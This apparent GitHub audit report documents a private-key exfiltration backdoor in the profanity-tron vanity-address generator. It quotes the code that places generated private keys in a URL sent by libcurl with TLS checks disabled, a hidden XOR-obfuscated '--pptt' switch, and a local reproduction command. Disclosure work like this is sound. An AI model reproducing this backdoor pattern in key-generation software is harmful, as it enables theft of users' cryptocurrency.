</p>

# profanity-tron Backdoor Theft Solid Audit Report (for profanity-tron source code)
# Attention! Reported by other authors, this author has deleted the repository and renamed it to: GenTronx Address: https://github.com/GenTronx/gpu

All the following authors are the same person:
<img width="2611" height="1521" alt="image" src="https://github.com/user-attachments/assets/e0e7bd37-26e7-473e-b256-1563d03c4ce8" />

Audit Scope 1: https://github.com/sodasord/profanity-tron

Audit Scope 2: https://github.com/sponsord/profanity-tron

Audit Scope 3: Account change on April 25, 2026: https://github.com/GenTronx/gpu<img width="2613" height="1731" alt="image" src="https://github.com/user-attachments/assets/7ee5f407-4c73-4199-9de7-607bceae01ff" />

Kanxue Analysis: https://bbs.kanxue.com/thread-289060.htm
<img width="2753" height="1731" alt="image" src="https://github.com/user-attachments/assets/a414fc55-4162-46d5-b038-6f1b05ebff2d" />
<img width="2608" height="1754" alt="image" src="https://github.com/user-attachments/assets/8cd71beb-f4cb-439a-bda5-e96215678fa6" />

Summary Conclusion: The source code in this directory **contains a logic path that can send “generated private keys + addresses” to an arbitrary URL over the network**, and it is enabled via **hidden parameters not disclosed in help/README**. At the same time, this network request explicitly **disables TLS verification**, which is a high-risk implementation. The above constitutes clear evidence of a “private key exfiltration/backdoor interface”.

---

## 1. Key Evidence: Generated Private Keys Can Be Exfiltrated (Plaintext in URL Parameters)

### 1.1 Exfiltration Function: `postResult(privateKey, address, postUrl)`

Location: [`Dispatcher.cpp:L378-L403`]

Core Code Points:

- Concatenates private key and address into query string:
  - `sendData = "privatekey=" + privateKey + "&address=" + address;` [`Dispatcher.cpp:L381`]
  - `sendUrl = postUrl + "?" + sendData;` [`Dispatcher.cpp:L382`]
- Uses libcurl to initiate a network request:
  - `curl_easy_setopt(curl, CURLOPT_URL, sendUrl.c_str());` [`Dispatcher.cpp:L387`]

This means: as long as `postUrl` is set to a non-empty string, the program can send **privatekey and address** as HTTP request parameters.

### 1.2 Trigger Timing: Upload Logic Executes on Every Match

Location: [`Dispatcher.cpp:L405-L452`]

Key Code Points:

- `printResult(...)` generates and prints:
  - `strPrivate` (private key) and `strPublicTron` (address) [`Dispatcher.cpp:L430-L443`]
- If `postUrl` is not empty, `postResult` is called:
  - `if(!postUrl.empty()) { postResult(strPrivate, strPublicTron, postUrl); }` [`Dispatcher.cpp:L449-L451`]

Additionally, `printResult(...)` is called when a match is found:

- `printResult(..., m_outputFile, m_postUrl);` [`Dispatcher.cpp:L454-L482`], especially [`L476`]

Conclusion: **As long as `m_postUrl` is non-empty**, the program will automatically attempt to exfiltrate `privatekey` and `address` when a vanity address is found.

---

## 2. Key Evidence: Hidden Parameter for Injecting Upload URL (Not Disclosed in Help/README)

### 2.1 Hidden Parameter Obfuscated as `pptt`

Location: [`profanity.cpp:L163-L166`]

Key Code Points:

- `_s` initialized as `{113, 113, 117, 117, 0}`, i.e., ASCII `"qquu"`
- Each character XORed with `1`: `_s[_k] ^= 1;` [`profanity.cpp:L164`]
- After XOR: `"pptt"` (since `'q'(113)^1='p'(112)`, `'u'(117)^1='t'(116)`)
- Registers CLI argument:
  - `argp.addSwitch('p', _s, __x9);` [`profanity.cpp:L165`]

Therefore, the actual supported parameters are:

- Short option: `-p <value>`
- Long option: `--pptt <value>`

### 2.2 This Hidden Parameter Is Passed Directly as `postUrl` to `Dispatcher`

Location: [`profanity.cpp:L307`]

Key Code Point:

- `Dispatcher d(..., outputFile, __x9);`

Also, `Dispatcher` defines `m_postUrl`, confirming this is a designed external input channel:

- `std::string m_postUrl;` [`Dispatcher.hpp:L116-L117`]

### 2.3 Not Disclosed in Help/README (Evidence of Concealment)

`help.hpp` only lists options like `--output/--matching/...`, without `--pptt` or `-p`:

- [`help.hpp`]

`README.md` also does not mention this parameter:

- [`README.md`]

Conclusion: This is not a normal public feature, but a **hidden upload URL injection entry point concealed via string obfuscation and omission from documentation**.

---

## 3. Key Evidence: TLS Verification Explicitly Disabled (HTTPS Can Be Intercepted)

Location: [`Dispatcher.cpp:L387-L392`]

Key Code Points:

- `curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);` [`Dispatcher.cpp:L390`]
- `curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);` [`Dispatcher.cpp:L391`]

This means: even if `postUrl` uses `https://`, the client does not verify certificates or hostnames, making it vulnerable to interception, proxying, or forged certificates.

---

## 4. How to Reproduce (Safe Local Testing, Do Not Use on External Networks)

Objective: Prove that the parameter enables exfiltration and includes the private key.

1) Start a local HTTP server and log requests (for local testing only)  
2) Run the program with the hidden parameter pointing to your local URL, e.g.:

- `-p http://127.0.0.1:8080/collect`
- or `--pptt http://127.0.0.1:8080/collect`

When a match is found and `Private:` is printed, a request like the following will be made:

- `http://127.0.0.1:8080/collect?privatekey=<hex>&address=<base58>`

See construction path: [`Dispatcher.cpp:L381-L387`]

---

## 5. Additional Audit Notes (Reproducibility / Credibility)

Functions like `Dispatcher::Device::createSeed()` are mentioned in the `README`, but only declarations are found in this directory, with no corresponding implementations (at least within the current file set). This affects the credibility and auditability of independent compilation and reproduction:

- Declaration: [`Dispatcher.hpp:L36-L41`]

---

## 6. Risk Conclusion

- Private key + address exfiltration implemented: **Confirmed**
- Hidden/obfuscated parameter to enable exfiltration: **Confirmed**
- TLS verification disabled in exfiltration logic: **Confirmed**

These three points combined constitute clear evidence of a **hidden key exfiltration/backdoor mechanism**. Such logic should not exist in any tool claiming to be a “secure and transparent” vanity address generator.
